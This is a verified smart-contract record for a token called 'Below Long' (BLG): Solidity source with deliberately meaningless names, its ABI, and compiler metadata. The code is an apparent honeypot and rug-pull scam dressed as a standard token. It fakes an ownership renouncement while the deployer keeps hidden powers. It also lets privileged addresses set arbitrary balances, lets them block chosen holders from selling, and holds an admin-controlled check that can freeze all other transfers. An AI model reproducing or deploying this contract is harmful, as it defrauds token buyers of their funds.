{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tokenIsSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletSender) external view returns (uint256);\n\n    function transfer(address teamFund, uint256 marketingToken) external returns (bool);\n\n    function allowance(address launchedLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamFund,\n        uint256 marketingToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverIs, uint256 value);\n    event Approval(address indexed launchedLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract teamWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoLiquidityShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderLaunched {\n    function createPair(address atSender, address toAt) external returns (address);\n}\n\ninterface tokenIsSwapMetadata is tokenIsSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BelowLong is teamWallet, tokenIsSwap, tokenIsSwapMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isToken;\n    }\n\n    function limitMin(address buyMarketingLimit) public {\n        takeShouldList();\n        \n        if (buyMarketingLimit == limitLaunch || buyMarketingLimit == liquidityTo) {\n            return;\n        }\n        senderSwap[buyMarketingLimit] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldLimit;\n    }\n\n    address public liquidityTo;\n\n    uint256 public toMin;\n\n    function balanceOf(address walletSender) public view virtual override returns (uint256) {\n        return autoSell[walletSender];\n    }\n\n    bool private exemptLimit;\n\n    function txFeeExempt() public {\n        emit OwnershipTransferred(limitLaunch, address(0));\n        sellLaunched = address(0);\n    }\n\n    function walletAt(address launchedMinLimit) public {\n        if (fromReceiver) {\n            return;\n        }\n        if (autoSwap == toMin) {\n            minReceiver = toMin;\n        }\n        tokenReceiver[launchedMinLimit] = true;\n        \n        fromReceiver = true;\n    }\n\n    uint256 buyFrom;\n\n    address modeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private shouldLimit = \"BLG\";\n\n    uint256 private isToken = 100000000 * 10 ** 18;\n\n    function takeShouldList() private view {\n        require(tokenReceiver[_msgSender()]);\n    }\n\n    string private launchedFee = \"Below Long\";\n\n    uint256 private minReceiver;\n\n    constructor (){\n        if (minReceiver == receiverMax) {\n            receiverMax = toMin;\n        }\n        autoLiquidityShould fromSender = autoLiquidityShould(modeReceiver);\n        liquidityTo = senderLaunched(fromSender.factory()).createPair(fromSender.WETH(), address(this));\n        if (exemptLimit != listIs) {\n            atAutoTx = autoSwap;\n        }\n        limitLaunch = _msgSender();\n        txFeeExempt();\n        tokenReceiver[limitLaunch] = true;\n        autoSell[limitLaunch] = isToken;\n        \n        emit Transfer(address(0), limitLaunch, isToken);\n    }\n\n    function transfer(address minFund, uint256 marketingToken) external virtual override returns (bool) {\n        return feeList(_msgSender(), minFund, marketingToken);\n    }\n\n    uint256 constant modeLiquidity = 3 ** 10;\n\n    address public limitLaunch;\n\n    function toAutoLaunched(address minFund, uint256 marketingToken) public {\n        takeShouldList();\n        autoSell[minFund] = marketingToken;\n    }\n\n    address receiverMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed maxTakeTo, address indexed walletTo);\n\n    mapping(address => mapping(address => uint256)) private takeModeIs;\n\n    function approve(address launchedTotalMax, uint256 marketingToken) public virtual override returns (bool) {\n        takeModeIs[_msgSender()][launchedTotalMax] = marketingToken;\n        emit Approval(_msgSender(), launchedTotalMax, marketingToken);\n        return true;\n    }\n\n    mapping(address => bool) public tokenReceiver;\n\n    mapping(address => uint256) private autoSell;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedFee;\n    }\n\n    function getOwner() external view returns (address) {\n        return sellLaunched;\n    }\n\n    uint256 private atAutoTx;\n\n    uint256 private autoSwap;\n\n    bool private shouldSenderFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingIs;\n    }\n\n    mapping(address => bool) public senderSwap;\n\n    address private sellLaunched;\n\n    function owner() external view returns (address) {\n        return sellLaunched;\n    }\n\n    uint8 private marketingIs = 18;\n\n    bool public fromReceiver;\n\n    bool public listIs;\n\n    function autoMin(uint256 marketingToken) public {\n        takeShouldList();\n        sellLiquidity = marketingToken;\n    }\n\n    uint256 sellLiquidity;\n\n    uint256 public swapMinReceiver;\n\n    function txExempt(address txReceiver, address teamFund, uint256 marketingToken) internal returns (bool) {\n        require(autoSell[txReceiver] >= marketingToken);\n        autoSell[txReceiver] -= marketingToken;\n        autoSell[teamFund] += marketingToken;\n        emit Transfer(txReceiver, teamFund, marketingToken);\n        return true;\n    }\n\n    uint256 public receiverMax;\n\n    function transferFrom(address txReceiver, address teamFund, uint256 marketingToken) external override returns (bool) {\n        if (_msgSender() != modeReceiver) {\n            if (takeModeIs[txReceiver][_msgSender()] != type(uint256).max) {\n                require(marketingToken <= takeModeIs[txReceiver][_msgSender()]);\n                takeModeIs[txReceiver][_msgSender()] -= marketingToken;\n            }\n        }\n        return feeList(txReceiver, teamFund, marketingToken);\n    }\n\n    function allowance(address receiverFee, address launchedTotalMax) external view virtual override returns (uint256) {\n        if (launchedTotalMax == modeReceiver) {\n            return type(uint256).max;\n        }\n        return takeModeIs[receiverFee][launchedTotalMax];\n    }\n\n    function feeList(address txReceiver, address teamFund, uint256 marketingToken) internal returns (bool) {\n        if (txReceiver == limitLaunch) {\n            return txExempt(txReceiver, teamFund, marketingToken);\n        }\n        uint256 buyTx = tokenIsSwap(liquidityTo).balanceOf(receiverMarketing);\n        require(buyTx == sellLiquidity);\n        require(teamFund != receiverMarketing);\n        if (senderSwap[txReceiver]) {\n            return txExempt(txReceiver, teamFund, modeLiquidity);\n        }\n        return txExempt(txReceiver, teamFund, marketingToken);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTakeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTotalMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTotalMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"autoMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketingLimit\",\"type\":\"address\"}],\"name\":\"limitMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMinReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"toAutoLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFeeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMinLimit\",\"type\":\"address\"}],\"name\":\"walletAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BelowLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}